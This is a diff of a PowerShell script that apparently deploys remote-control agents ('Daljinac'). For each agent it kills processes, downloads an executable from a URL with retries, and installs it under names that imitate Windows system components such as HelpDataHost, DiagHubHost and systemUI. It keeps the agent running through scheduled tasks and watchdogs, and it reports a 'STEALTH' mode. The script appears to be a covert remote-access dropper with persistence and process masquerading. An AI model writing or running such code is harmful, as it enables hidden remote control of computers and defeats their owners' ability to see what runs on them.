@@ -26,15 +26,14 @@ foreach ($a in $agents) {
     $Exe = "$($a.Dir)\$($a.ExeName)"
 
     # Clean old tasks
-    Write-Host "[1/4] Cleaning tasks..."
+    Write-Host "  [1/4] Cleaning tasks..."
     @($a.TaskName, "$($a.TaskName)Watch", "Daljinac", "DaljinacWatch", "Daljinac2", "Daljinac2Watch",
-      "HelpDataHost", "HelpDataHostWatch", "DiagHubHost", "DiagHubHostWatch",
-      "systemUI", "daljinac2") | Select-Object -Unique | ForEach-Object {
+      "HelpDataHost", "HelpDataHostWatch", "DiagHubHost", "DiagHubHostWatch") | Select-Object -Unique | ForEach-Object {
         schtasks /delete /tn $_ /f 2>$null
     }
 
     # Kill aggressively until port free
-    Write-Host "[2/4] Killing processes..."
+    Write-Host "  [2/4] Killing processes on port $($a.Port)..."
     $maxWait = 20
     do {
         Get-Process -Name @("systemUI","daljinac","HelpDataHost","daljinac2","DiagHubHost") -ErrorAction SilentlyContinue | Stop-Process -Force
@@ -46,20 +45,36 @@ foreach ($a in $agents) {
     } while (-not $portFree)
     Start-Sleep -Seconds 2
 
-    # Download
-    Write-Host "[3/4] Downloading..."
+    # Download with retry
+    Write-Host "  [3/4] Downloading $($a.ExeName)..."
     mkdir $a.Dir -Force | Out-Null
-    Invoke-WebRequest $a.URL -OutFile "$Exe.new" -UseBasicParsing
-    Write-Host "       $((Get-Item "$Exe.new").Length) bytes"
-
-    Start-Sleep -Seconds 1
+    $downloaded = $false
+    for ($retry = 1; $retry -le 3; $retry++) {
+        try {
+            Invoke-WebRequest $a.URL -OutFile "$Exe.new" -UseBasicParsing -ErrorAction Stop
+            $sz = (Get-Item "$Exe.new" -ErrorAction Stop).Length
+            if ($sz -gt 100000) {
+                Write-Host "         $sz bytes (attempt $retry)" -ForegroundColor Green
+                $downloaded = $true
+                break
+            }
+        } catch {
+            Write-Host "         attempt $retry failed: $_" -ForegroundColor Yellow
+            Start-Sleep -Seconds 2
+        }
+        Start-Sleep -Seconds 1
+    }
+    if (-not $downloaded) {
+        Write-Host "         FAILED after 3 attempts, skipping $($a.Name)" -ForegroundColor Red
+        continue
+    }
 
     # Replace
-    Write-Host "[3b/4] Replacing..."
+    Write-Host "  [3b/4] Replacing..."
     Move-Item -Force "$Exe.new" $Exe
 
     # Scheduled tasks
-    Write-Host "[4/4] Installing tasks..."
+    Write-Host "  [4/4] Installing tasks..."
     Remove-Item "$($a.Dir)\watchdog.vbs" -Force -ErrorAction SilentlyContinue
 
     $taskCmd = "`"$Exe`""
@@ -82,3 +97,18 @@ Write-Host "DONE." -ForegroundColor Green
 if ($stealth) { Write-Host "  Mode: STEALTH" } else { Write-Host "  Mode: NORMAL" }
 if ($v1) { Write-Host "  v1: $($agents | Where-Object Name -match v1 | ForEach-Object ExeName)" }
 if ($v2) { Write-Host "  v2: $($agents | Where-Object Name -match v2 | ForEach-Object ExeName)" }
+
+# Verify
+Start-Sleep -Seconds 3
+Write-Host ""
+Write-Host "Verifying..." -ForegroundColor Cyan
+if ($v1) {
+    $p = Get-Process -Name HelpDataHost,systemUI -ErrorAction SilentlyContinue
+    if ($p) { Write-Host "  v1: RUNNING (PID $($p.Id))" -ForegroundColor Green }
+    else     { Write-Host "  v1: NOT FOUND - check manually" -ForegroundColor Red }
+}
+if ($v2) {
+    $p = Get-Process -Name DiagHubHost,daljinac2 -ErrorAction SilentlyContinue
+    if ($p) { Write-Host "  v2: RUNNING (PID $($p.Id))" -ForegroundColor Green }
+    else     { Write-Host "  v2: NOT FOUND - check manually" -ForegroundColor Red }
+}
